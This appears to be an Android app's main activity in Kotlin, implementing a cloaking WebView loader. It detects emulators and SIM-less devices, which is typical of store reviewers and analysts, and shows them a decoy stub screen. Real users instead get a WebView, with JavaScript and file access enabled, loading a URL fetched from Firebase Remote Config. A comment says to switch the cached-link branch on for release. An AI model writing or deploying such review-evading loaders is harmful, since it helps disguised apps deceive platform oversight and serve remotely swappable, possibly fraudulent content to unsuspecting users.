package com.example.webviewadapp

import android.annotation.SuppressLint
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.Build
import android.os.Bundle
import android.os.PersistableBundle
import android.telephony.TelephonyManager
import android.view.View
import android.webkit.CookieManager
import android.webkit.WebViewClient
import androidx.appcompat.app.AppCompatActivity
import com.example.webviewadapp.databinding.ActivityMainBinding
import com.google.firebase.ktx.Firebase
import com.google.firebase.remoteconfig.ktx.remoteConfig
import com.google.firebase.remoteconfig.ktx.remoteConfigSettings
import java.util.*


private const val PREF_NAME = "com.example.webviewadapp"
private const val LINK_KEY = "linkKey"

class MainActivity : AppCompatActivity() {

    private lateinit var binding: ActivityMainBinding
    private lateinit var link: String
    private lateinit var preferences: SharedPreferences
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)

        if (savedInstanceState != null) {
            binding.webView.restoreState(savedInstanceState)
        } else {
            initWebView()
            preferences = getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE)
            link = preferences.getString(LINK_KEY, "").toString()

            if (link != "") {
                showCap()
//                showPage(link)    // TODO поменять в релизе
            } else if (isDeviceEmulator() || isSimAbsent()) {
                showCap()
            } else {
                goToDatabase()
            }
        }
        binding.tryAgainButton.setOnClickListener { showPage(link) }
    }

    override fun onSaveInstanceState(outState: Bundle, outPersistentState: PersistableBundle) {
        super.onSaveInstanceState(outState, outPersistentState)
        binding.webView.saveState(outState)
    }

    private fun showPage(link: String) {
        hideInternetLackMessage()
        if (isInternetAvailable()) {
            binding.webView.loadUrl(link)
        } else {
            showInternetLackMessage()
        }
    }

    @SuppressLint("SetJavaScriptEnabled")
    private fun initWebView() {
        binding.webView.webViewClient = WebViewClient()
        val webSettings = binding.webView.settings
        webSettings.loadWithOverviewMode = true
        webSettings.useWideViewPort = true
        webSettings.javaScriptEnabled = true
        webSettings.domStorageEnabled = true
        webSettings.javaScriptCanOpenWindowsAutomatically = true
        webSettings.databaseEnabled = true
        webSettings.setSupportZoom(false)
        webSettings.allowFileAccess = true
        webSettings.allowContentAccess = true
        val cookieManager = CookieManager.getInstance()
        cookieManager.setAcceptCookie(true)
    }

    private fun showInternetLackMessage() {
        binding.webView.visibility = View.GONE
        binding.internetLackLayout.visibility = View.VISIBLE
    }

    private fun hideInternetLackMessage() {
        binding.webView.visibility = View.VISIBLE
        binding.internetLackLayout.visibility = View.GONE
    }

    private fun isInternetAvailable(): Boolean {
        val connectivityManager =
            getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) {
            val activeNetworkInfo = connectivityManager.activeNetworkInfo
            if (activeNetworkInfo != null && activeNetworkInfo.isConnected) {
                return true
            }
        } else {
            val capabilities =
                connectivityManager.getNetworkCapabilities(connectivityManager.activeNetwork)
            if (capabilities != null) {
                return capabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) ||
                        capabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) ||
                        capabilities.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET)
            }
        }
        return false
    }

    private fun isDeviceEmulator(): Boolean {
        if (BuildConfig.DEBUG) return false // when developer use this build on emulator
        val phoneModel = Build.MODEL
        val buildProduct = Build.PRODUCT
        val buildHardware = Build.HARDWARE
        var result = (Build.FINGERPRINT.startsWith("generic")
                || phoneModel.contains("google_sdk")
                || phoneModel.lowercase(Locale.getDefault()).contains("droid4x")
                || phoneModel.contains("Emulator")
                || phoneModel.contains("Android SDK built for x86")
                || Build.MANUFACTURER.contains("Genymotion")
                || buildHardware == "goldfish"
                || Build.BRAND.contains("google")
                || buildHardware == "vbox86"
                || buildProduct == "sdk"
                || buildProduct == "google_sdk"
                || buildProduct == "sdk_x86"
                || buildProduct == "vbox86p"
                || Build.BOARD.lowercase(Locale.getDefault()).contains("nox")
                || Build.BOOTLOADER.lowercase(Locale.getDefault()).contains("nox")
                || buildHardware.lowercase(Locale.getDefault()).contains("nox")
                || buildProduct.lowercase(Locale.getDefault()).contains("nox"))
        if (result) return true
        result = (Build.BRAND.startsWith("generic") && Build.DEVICE.startsWith("generic"))
        if (result) return true
        result = "google_sdk" == buildProduct
        return result
    }

    private fun isSimAbsent(): Boolean {
        val telManager = getSystemService(TELEPHONY_SERVICE) as TelephonyManager
        if (telManager.simState == TelephonyManager.SIM_STATE_ABSENT)
            return true
        return false
    }

    private fun goToDatabase() {
        try {
            val remoteConfig = Firebase.remoteConfig
            val configSettings = remoteConfigSettings {
                minimumFetchIntervalInSeconds = 0
            }
            remoteConfig.setConfigSettingsAsync(configSettings)
            remoteConfig.setDefaultsAsync(mapOf("url" to ""))
            remoteConfig.fetchAndActivate().addOnCompleteListener { task ->
                link = remoteConfig.getString("url")
                if (!task.isSuccessful) {
                    throw Exception("Database task isn't Successful")
                } else if (link == "") {
                    showCap()
                } else {
                    preferences.edit().putString(LINK_KEY, link).apply()
                    showPage(link)
                }
            }
        } catch (e: Exception) {
            showDatabaseError(e.message)
        }
    }

    private fun showDatabaseError(message: String?) {
        binding.errorTextView.text = message
        binding.webView.visibility = View.GONE
        binding.errorLayout.visibility = View.VISIBLE
    }

    private fun showCap() {
        startActivity(Intent(this, CapActivity::class.java))
        finish()
    }
}